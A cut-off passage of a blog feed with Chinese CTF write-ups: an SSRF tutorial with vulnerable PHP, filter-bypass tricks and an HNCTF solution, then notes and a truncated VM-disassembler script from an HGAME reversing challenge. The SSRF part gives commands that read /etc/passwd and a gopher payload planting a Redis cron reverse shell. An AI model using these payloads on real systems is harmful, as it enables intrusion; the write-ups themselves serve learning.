function_ invoke__">fopen</span>()、<span class="hljs-title function_ invoke__">readfile</span>()<br></code></pre></td></tr></table></figure><h3 id="函数解释"><a href="#函数解释" class="headerlink" title="函数解释"></a>函数解释</h3><ol><li><p>file_get_contents()</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$url</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>];;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$url</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>从指定的url获取内容，然后指定到一个文件名进行保存，并展示给用户，file_put_content则是把一个字符串写入文件中</p></li><li><p>fsockopen()</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">GetFile</span>(<span class="hljs-params"><span class="hljs-variable">$host</span>,<span class="hljs-variable">$port</span>,<span class="hljs-variable">$link</span></span>) </span>&#123; <br>    <span class="hljs-variable">$fp</span> = <span class="hljs-title function_ invoke__">fsockopen</span>(<span class="hljs-variable">$host</span>, <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$port</span>), <span class="hljs-variable">$errno</span>, <span class="hljs-variable">$errstr</span>, <span class="hljs-number">30</span>);   <br>    <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$fp</span>) &#123; <br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$errstr</span> (error number <span class="hljs-subst">$errno</span>) \n&quot;</span>; <br>    &#125; <span class="hljs-keyword">else</span> &#123; <br>        <span class="hljs-variable">$out</span> = <span class="hljs-string">&quot;GET <span class="hljs-subst">$link</span> HTTP/1.1\r\n&quot;</span>; <br>        <span class="hljs-variable">$out</span> .= <span class="hljs-string">&quot;Host: <span class="hljs-subst">$host</span>\r\n&quot;</span>; <br>        <span class="hljs-variable">$out</span> .= <span class="hljs-string">&quot;Connection: Close\r\n\r\n&quot;</span>; <br>        <span class="hljs-variable">$out</span> .= <span class="hljs-string">&quot;\r\n&quot;</span>; <br>        <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$fp</span>, <span class="hljs-variable">$out</span>); <br>        <span class="hljs-variable">$contents</span>=<span class="hljs-string">&#x27;&#x27;</span>; <br>        <span class="hljs-keyword">while</span> (!<span class="hljs-title function_ invoke__">feof</span>(<span class="hljs-variable">$fp</span>)) &#123; <br>            <span class="hljs-variable">$contents</span>.= <span class="hljs-title function_ invoke__">fgets</span>(<span class="hljs-variable">$fp</span>, <span class="hljs-number">1024</span>); <br>        &#125; <br>        <span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$fp</span>); <br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$contents</span>; <br>    &#125; <br>&#125;<br></code></pre></td></tr></table></figure><p>fsockopen函数实现对用户指定url数据的获取，使用端口建立tcp连接，变量host为主机名，port为端口，errstr表示错误以字符传的信息返回，30为时限</p></li><li><p>curl_exec()</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$link</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br>    <span class="hljs-variable">$curlobj</span> = <span class="hljs-title function_ invoke__">curl_init</span>();<span class="hljs-comment">// 创建新的 cURL 资源</span><br>    <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$curlobj</span>, CURLOPT_POST, <span class="hljs-number">0</span>);<br>    <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$curlobj</span>,CURLOPT_URL,<span class="hljs-variable">$link</span>);<br>    <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$curlobj</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<span class="hljs-comment">// 设置 URL 和相应的选项</span><br>    <span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$curlobj</span>);<span class="hljs-comment">// 抓取 URL 并把它传递给浏览器</span><br>    <span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$curlobj</span>);<span class="hljs-comment">// 关闭 cURL 资源，并且释放系统资源</span><br><br>    <span class="hljs-variable">$filename</span> = <span class="hljs-string">&#x27;./curled/&#x27;</span>.<span class="hljs-title function_ invoke__">rand</span>().<span class="hljs-string">&#x27;.txt&#x27;</span>;<br>    <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-variable">$result</span>); <br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$result</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>curl_exec函数用于执行指定的cURL会话</p><blockquote><p>1.一般情况下PHP不会开启fopen的gopher wrapper<br>2.file_get_contents的gopher协议不能URL编码<br>3.file_get_contents关于Gopher的302跳转会出现bug，导致利用失败<br>4.curl&#x2F;libcurl 7.43 上gopher协议存在bug(%00截断) 经测试7.49 可用<br>5.curl_exec() &#x2F;&#x2F;默认不跟踪跳转，<br>6.file_get_contents() &#x2F;&#x2F; file_get_contents支持php:&#x2F;&#x2F;input协议</p></blockquote></li></ol><h2 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h2><ol><li>使用file协议 file protocol (任意文件读取)<blockquote><p>curl -vvv “<a href="http://target/ssrf.php?url=file:///etc/passwd">http://target/ssrf.php?url=file:///etc/passwd</a>“</p></blockquote></li><li>使用dict协议 dict protocol (获取Redis配置信息)<blockquote><p>curl -vvv “<a href="http://target/ssrf.php?url=dict://127.0.0.1:6379/info">http://target/ssrf.php?url=dict://127.0.0.1:6379/info</a>“</p></blockquote></li><li>使用gopher协议(俗称万能协议) gopher protocol (一键反弹Bash)<blockquote><p>curl -vvv “<a href="http://target/ssrf.php?url=gopher://127.0.0.1:6379/_*1">http://target/ssrf.php?url=gopher://127.0.0.1:6379/_*1</a> %0d %0a $8%0d %0aflushall %0d %0a<em>3 %0d %0a $3%0d %0aset %0d %0a $1%0d %0a1 %0d %0a $64%0d %0a %0d %0a %0a %0a</em>&#x2F;1 * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;127.0.0.1&#x2F;4444 0&gt;&amp;1 %0a %0a %0a %0a %0a %0d %0a %0d %0a %0d %0a<em>4 %0d %0a $6%0d %0aconfig %0d %0a $3%0d %0aset %0d %0a $3%0d %0adir %0d %0a $16%0d %0a&#x2F;var&#x2F;spool&#x2F;cron&#x2F; %0d %0a</em>4 %0d %0a $6%0d %0aconfig %0d %0a $3%0d %0aset %0d %0a $10%0d %0adbfilename %0d %0a $4%0d %0aroot %0d %0a*1 %0d %0a $4%0d %0asave %0d %0aquit %0d %0a”</p></blockquote></li></ol><h2 id="SSRF漏洞绕过方法"><a href="#SSRF漏洞绕过方法" class="headerlink" title="SSRF漏洞绕过方法"></a>SSRF漏洞绕过方法</h2><p>-常用的绕过方法<br>　1.@　　　　　　　　　　<a href="http://abc.com@127.0.0.1/">http://abc.com@127.0.0.1</a></p><p>　　2.添加端口号　　　　　　<a href="http://127.0.0.1:8080/">http://127.0.0.1:8080</a></p><p>　　3.短地址　　　　　　　　<a href="https://0x9.me/cuGfD">https://0x9.me/cuGfD</a><br>推荐：<a href="http://tool.chinaz.com/tools/dwz.aspx%E3%80%81https://dwz.cn/">http://tool.chinaz.com/tools/dwz.aspx、https://dwz.cn/</a></p><p>　　4.可以指向任意ip的域名　 xip.io<br>原理是DNS解析。xip.io可以指向任意域名，即127.0.0.1.xip.io，可解析为127.0.0.1</p><p>　　5.ip地址转换成进制来访问 192.168.0.1&#x3D;3232235521（十进制） </p><p>　　6.非HTTP协议</p><p>　　7.DNS Rebinding</p><p>　　8.利用[::]绕过                 http:&#x2F;&#x2F;[::]:80&#x2F; &gt;&gt;&gt; <a href="http://127.0.0.1/">http://127.0.0.1</a></p><p>　　9.句号绕过                  127。0。0。1 &gt;&gt;&gt; 127.0.0.1</p><p>　　10.利用302跳转绕过     使用<a href="https://tinyurl.com生成302跳转地址/">https://tinyurl.com生成302跳转地址</a></p><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="HNCTF-2022-WEEK2-ez-ssrf"><a href="#HNCTF-2022-WEEK2-ez-ssrf" class="headerlink" title="[HNCTF 2022 WEEK2]ez_ssrf"></a>[HNCTF 2022 WEEK2]ez_ssrf</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-variable">$data</span>=<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;data&#x27;</span>]);<br><span class="hljs-variable">$host</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;host&#x27;</span>];<br><span class="hljs-variable">$port</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;port&#x27;</span>];<br><span class="hljs-variable">$fp</span>=<span class="hljs-title function_ invoke__">fsockopen</span>(<span class="hljs-variable">$host</span>,<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$port</span>),<span class="hljs-variable">$error</span>,<span class="hljs-variable">$errstr</span>,<span class="hljs-number">30</span>);<br><span class="hljs-keyword">if</span>(!<span class="hljs-variable">$fp</span>) &#123;<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$fp</span>,<span class="hljs-variable">$data</span>);<br>    <span class="hljs-keyword">while</span>(!<span class="hljs-title function_ invoke__">feof</span>(<span class="hljs-variable">$data</span>))<br>    &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">fgets</span>(<span class="hljs-variable">$fp</span>,<span class="hljs-number">128</span>);<br>    &#125;<br>    <span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$fp</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>扫描本地文件发现有flag.php，尝试读取，发现🥰localhost plz🥰，要从本地读取，利用fsockopen的协议构造payload，创建来自本地的请求,有一个坑点就是data的数据构造是利用php来生成的base64加密，不然会出现问题</p><blockquote><p> ?host&#x3D;127.0.0.1&amp;port&#x3D;80&amp;data&#x3D;R0VUIC9mbGFnLnBocCBIVFRQLzEuMQ0KSG9zdDogMTI3LjAuMC4xDQpDb25uZWN0aW9uOiBDbG9zZQ0KDQo&#x3D;</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$out</span> = <span class="hljs-string">&quot;GET /flag.php HTTP/1.1\r\n&quot;</span>;<br><span class="hljs-variable">$out</span> .= <span class="hljs-string">&quot;Host: 127.0.0.1\r\n&quot;</span>;<br><span class="hljs-variable">$out</span> .= <span class="hljs-string">&quot;Connection: Close\r\n\r\n&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$out</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$out</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>GET &#x2F;flag.php HTTP&#x2F;1.1<br>Host: 127.0.0.1<br>Connection: Close<br>R0VUIC9mbGFnLnBocCBIVFRQLzEuMQ0KSG9zdDogMTI3LjAuMC4xDQpDb25uZWN0aW9uOiBDbG9zZQ0KDQo&#x3D;</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;介绍&quot;&gt;&lt;a href=&quot;#介绍&quot; class=&quot;headerlink&quot; title=&quot;介绍&quot;&gt;&lt;/a&gt;介绍&lt;/h1&gt;&lt;p&gt;SSRF (Server-Side Request Forgery,服务器端请求伪造)是一种由攻击者构造请求，由服务端发起请求的安全漏洞。一</summary>
      
    
    
    
    <category term="CTF" scheme="https://fogpost.top/categories/CTF/"/>
    
    
    <category term="web" scheme="https://fogpost.top/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>逆向出题记录</title>
    <link href="https://fogpost.top/2024/11/05/%E9%80%86%E5%90%91%E5%87%BA%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    <id>https://fogpost.top/2024/11/05/%E9%80%86%E5%90%91%E5%87%BA%E9%A2%98%E8%AE%B0%E5%BD%95/</id>
    <published>2024-11-05T01:38:29.000Z</published>
    <updated>2024-11-05T01:42:31.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="逆向出题记录"><a href="#逆向出题记录" class="headerlink" title="逆向出题记录"></a>逆向出题记录</h1><p>既然要出题还是新手题就要先了解，出什么题型，这个题有什么用，对工具有什么需求<br>先说一下题型逆向新生题主要有这些(base64，tea家族，动态调试，花指令，打包和反编译，压缩壳，z3，迷宫)<br>先测试一下base64</p><h2 id="2024-11-05"><a href="#2024-11-05" class="headerlink" title="2024-11-05"></a>2024-11-05</h2><h3 id="1-题目描述"><a href="#1-题目描述" class="headerlink" title="1. 题目描述"></a>1. 题目描述</h3><p>题目名称：flag</p><p>题目描述：flag{1234567890}</p><p>题目附件：flag.exe</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;逆向出题记录&quot;&gt;&lt;a href=&quot;#逆向出题记录&quot; class=&quot;headerlink&quot; title=&quot;逆向出题记录&quot;&gt;&lt;/a&gt;逆向出题记录&lt;/h1&gt;&lt;p&gt;既然要出题还是新手题就要先了解，出什么题型，这个题有什么用，对工具有什么需求&lt;br&gt;先说一下题型逆向新生题主</summary>
      
    
    
    
    <category term="CTF" scheme="https://fogpost.top/categories/CTF/"/>
    
    
    <category term="ctf" scheme="https://fogpost.top/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>ctf_vm虚拟机</title>
    <link href="https://fogpost.top/2024/11/02/ctf-vm%E8%99%9A%E6%8B%9F%E6%9C%BA/"/>
    <id>https://fogpost.top/2024/11/02/ctf-vm%E8%99%9A%E6%8B%9F%E6%9C%BA/</id>
    <published>2024-11-02T01:56:22.000Z</published>
    <updated>2024-11-02T03:38:48.538Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ctf-vm虚拟机"><a href="#ctf-vm虚拟机" class="headerlink" title="ctf_vm虚拟机"></a>ctf_vm虚拟机</h1><p>最近打些大比赛果然都有这个虚拟机，但是本人学的不够精细，这次强网杯又有了，借此机会来开个新篇章让自己的技术和见识都涨涨</p><h2 id="HGAME-2023-week4-vm"><a href="#HGAME-2023-week4-vm" class="headerlink" title="[HGAME 2023 week4]vm"></a>[HGAME 2023 week4]vm</h2><p>先借助去年的HGAME来了解一下，这个题非常好，因为已经有了较多的wp可以借助前人的智慧来分析分析，虚拟机题简单来讲就是利用伪代码，在程序中重新实现了一个虚拟机，其实就是把几个重要的汇编代码隐藏起来了而已，我们就要去分析在哪发生了什么。</p><ul><li>查壳<br>可以看出这个是c++编写的64位EXE程序，没有壳<br><img src="https://gitee.com/fogpost/photo/raw/master/202411021001405.png" srcset="/img/loading.gif" lazyload></li><li>IDA分析<br>可见这个直接就是一个简单的判断我们直达vm虚拟机内部<br><img src="https://gitee.com/fogpost/photo/raw/master/202411021004776.png" srcset="/img/loading.gif" lazyload><br>这代表这这个命令函数的最大值是255(0xff)<br><img src="https://gitee.com/fogpost/photo/raw/master/202411021005546.png" srcset="/img/loading.gif" lazyload><br>进入虚拟机主要函数，逐步分析每个分支分别代表什么<br><img src="https://gitee.com/fogpost/photo/raw/master/202411021021368.png" srcset="/img/loading.gif" lazyload><br>我们来看看每个函数的内部来了解发生了什么</li></ul><ol><li>mov<br><img src="https://gitee.com/fogpost/photo/raw/master/202411021023687.png" srcset="/img/loading.gif" lazyload></li><li>push&amp;pop<br>这两个同理<br><img src="https://gitee.com/fogpost/photo/raw/master/202411021026035.png" srcset="/img/loading.gif" lazyload><br><img src="https://gitee.com/fogpost/photo/raw/master/202411021027121.png" srcset="/img/loading.gif" lazyload></li><li>mul数据计算单元<br>感觉和我们之前学的数电计算单元一样，单独分出了一个模块来运算操作，分别是【+、-、*、^、&lt;&lt;、&gt;&gt;、0】<br><img src="https://gitee.com/fogpost/photo/raw/master/202411021031712.png" srcset="/img/loading.gif" lazyload></li><li>cmp比较单元<br>直接看就看出来了，从cmp也是相同为0不同为1<br><img src="https://gitee.com/fogpost/photo/raw/master/202411021033928.png" srcset="/img/loading.gif" lazyload></li><li>jmp跳转单元<br><img src="https://gitee.com/fogpost/photo/raw/master/202411021034959.png" srcset="/img/loading.gif" lazyload></li><li>je和jne<br>相同跳转和不相同跳转<br><img src="https://gitee.com/fogpost/photo/raw/master/202411021037299.png" srcset="/img/loading.gif" lazyload><br><img src="https://gitee.com/fogpost/photo/raw/master/202411021037492.png" srcset="/img/loading.gif" lazyload></li></ol><p>至此已分析完毕,很简单对不对，汇编语句总共就那么多条，常用且能用的就更少了我们只要仔细分析就行</p><ul><li>exp<br>直接抄的，这个其实涉及一些idc脚本的编写，之后我也会出一篇博客来讲，怎么利用idc脚本去进行SMC的解密以及花指令的去除<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs python">opcode = [<span class="hljs-number">0x00</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x03</span>,<span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x32</span>,<span class="hljs-number">0x03</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x00</span>,<span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x03</span>,<span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x03</span>,<span class="hljs-number">0x00</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>,<span class="hljs-number">0x03</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x02</span>,<span class="hljs-number">0x00</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x00</span>,<span class="hljs-number">0x03</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x28</span>,<span class="hljs-number">0x04</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x02</span>,<span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x96</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x01</span>,<span class="hljs-number">0x03</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x03</span>,<span class="hljs-number">0x01</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>]<br>input1 = []<br>i = <span class="hljs-number">0</span><br><span class="hljs-keyword">while</span> opcode[i] != <span class="hljs-number">0xFF</span>:<br>    <span class="hljs-keyword">match</span> opcode[i]:<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">0x00</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;i&#125;</span>&#x27;</span>, end=<span class="hljs-string">&#x27; &#x27;</span>)<br>            o = i + <span class="hljs-number">1</span><br>            <span class="hljs-keyword">if</span> opcode[o]:<br>                <span class="hljs-keyword">match</span> opcode[o]:<br>                    <span class="hljs-keyword">case</span> <span class="hljs-number">0x01</span>:<br>                        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;mov input[reg[2]], reg[0]&quot;</span>)<br>                    <span class="hljs-keyword">case</span> <span class="hljs-number">0x02</span>:<br>                        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;mov reg[%d], reg[%d]&quot;</span> % (opcode[i+<span class="hljs-number">2</span>],opcode[i+<span class="hljs-number">3</span>]))<br>                    <span class="hljs-keyword">case</span> <span class="hljs-number">0x03</span>:<br>                        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;mov reg[%d], %d&quot;</span> % (opcode[i+<span class="hljs-number">2</span>], opcode[i+<span class="hljs-number">3</span>]))<br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;mov reg[0], input[reg[2]]&quot;</span>)<br>            i += <span class="hljs-number">4</span><br>        <span class="hljs-keyword">case</span> <span class="hljs-number">0x01</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;i&#125;</span>&#x27;</span>, end=<span class="hljs-string">&#x27; &#x27;</span>)<br>            o = i + <span class="hljs-number">1</span><br>            <span class="hljs-keyword">if</span> opcode[o]:<br>                <span class="hljs-keyword">match</span> opcode[o]:<br>                    <span class="hljs-keyword">case</span> <span class="hljs-number">0x01</span>:<br>                        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;push reg[0]&quot;</span>)<br>                    <span class="hljs-keyword">case</span> <span class="hljs-number">0x02</span>:<br>                        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;push reg[2]&quot;</span>)<br>                    <span class="hljs-keyword">case</span> <span class="hljs-number">0x03</span>:<br>                        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;push reg[3]&quot;</span>)<br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;push reg[0]&quot;</span>)<br>            i += <span class="hljs-number">2</span><br>        <span class="hljs-keyword">case</span> <span class="hljs-number">0x02</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;i&#125;</span>&#x27;</span>, end=<span class="hljs-string">&#x27; &#x27;</span>)<br>            o = i + <span class="hljs-number">1</span><br>            <span class="hljs-keyword">if</span> opcode[o]:<br>                <span class="hljs-keyword">match</span> opcode[o]:<br>                    <span class="hljs-keyword">case</span> <span class="hljs-number">0x01</span>:<br>                        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;pop reg[1]&quot;</span>)<br>                    <span class="hljs-keyword">case</span> <span class="hljs-number">0x02</span>:<br>                        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;pop reg[2]&quot;</span>)<br>                    <span class="hljs-keyword">case</span> <span class="hljs-number">0x03</span>:<br>                        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;pop reg[3]&quot;</span>)<br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;pop reg[0]&quot;</span>)<br>            i += <span class="hljs-number">2</span><br>        <span class="hljs-keyword">case</span> <span class="hljs-number">0x03</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;i&#125;</span>&#x27;</span>, end=<span class="hljs-string">&#x27; &#x27;</span>)<br>            o = i + <span class="hljs-number">1</span><br>            <span class="hljs-keyword">match</span> opcode[o]:<br>                <span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:<br>                    